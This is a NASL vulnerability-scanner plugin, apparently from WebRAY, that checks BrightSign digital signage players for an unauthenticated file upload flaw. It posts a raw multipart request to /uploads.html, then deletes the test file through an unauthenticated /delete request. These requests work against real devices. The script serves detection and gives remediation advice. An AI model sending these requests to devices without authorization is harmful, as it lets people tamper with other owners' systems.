############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799143);
 name = "BrightSign multimedia device uploads.html - file upload";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"BrightSign is a leading network digital signage player in the global market, which is composed of server, network, player and display device. It sends the information of server or PC player controller to the player through the network (WAN/LAN/private network), and then the player combines audio and video, picture, text and other information to the display device. BrightSign provides reliable solid-state digital signage controller and high-quality demonstration. Because there is no access control set on the file upload page, any attacker can browse the uploaded file at will, which is harmful to the system.");
 script_set_attribute(attribute:"solution", value:"1. Set access rights to sensitive pages. 2. If not necessary, do not open to the public network.");
 script_end_attributes();
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==80 ) host=host1;
    else host = string(host1,":",port);
	
	req = 'POST /uploads.html?rp=sd HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Content-Type: multipart/form-data; boundary=---------------------------293582696224464\r\n' +
	  'Content-Length: 202\r\n' +
	  'Upgrade-Insecure-Requests: 1\r\n' +
	  'Connection: close\r\n\r\n' +
	  '-----------------------------293582696224464\r\nContent-Disposition: form-data; name="datafile[]"; filename="123qweasdwef.txt"\r\nContent-Type: text/plain\r\n\r\n-----------------------------293582696224464--';
     
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	req1 = http_get(item:"/delete?filename=sd%2F123qweasdwef.txt&delete=Delete", port:port);
	buf1 = http_keepalive_send_recv(port:port,data:req1,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if( "200 "><buf && ("File Uploaded Successfully"><buf || "already exists"><buf)){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==443 ) host=host1;
    else host = string(host1,":",port);

	req = 'POST /uploads.html?rp=sd HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
	  'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
	  'Content-Type: multipart/form-data; boundary=---------------------------293582696224464\r\n' +
	  'Content-Length: 202\r\n' +
	  'Upgrade-Insecure-Requests: 1\r\n' +
	  'Connection: close\r\n\r\n' +
	  '-----------------------------293582696224464\r\nContent-Disposition: form-data; name="datafile[]"; filename="123qweasdwef.txt"\r\nContent-Type: text/plain\r\n\r\n-----------------------------293582696224464--';

	ssl_req = https_req_get(port:port,request:req);
	req1 = http_get(item:"/delete?filename=sd%2F123qweasdwef.txt&delete=Delete", port:port);
	ssl_req1 = https_req_get(port:port,request:req1);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "200 "><ssl_req && ("File Uploaded Successfully"><ssl_req || "already exists"><ssl_req) ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
